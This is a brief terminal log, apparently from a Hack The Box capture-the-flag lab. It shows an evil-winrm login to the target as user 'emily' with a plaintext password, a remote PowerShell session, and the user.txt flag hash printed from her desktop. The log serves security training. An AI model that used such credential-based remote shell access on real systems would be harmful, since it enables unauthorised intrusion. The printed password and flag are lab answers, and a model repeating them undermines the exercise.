
```sh
┌──(fixit42㉿kali)-[~/boxes/htb/administrator/10.129.229.8]
└─$ evil-winrm -i 10.129.229.8 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline                                                                                                                            
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\emily\desktop> ls


    Directory: C:\Users\emily\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         8/12/2025   7:18 PM             34 user.txt


*Evil-WinRM* PS C:\Users\emily\desktop> type user.txt
ff0847458ad23215bc4424bc8c8fb891
```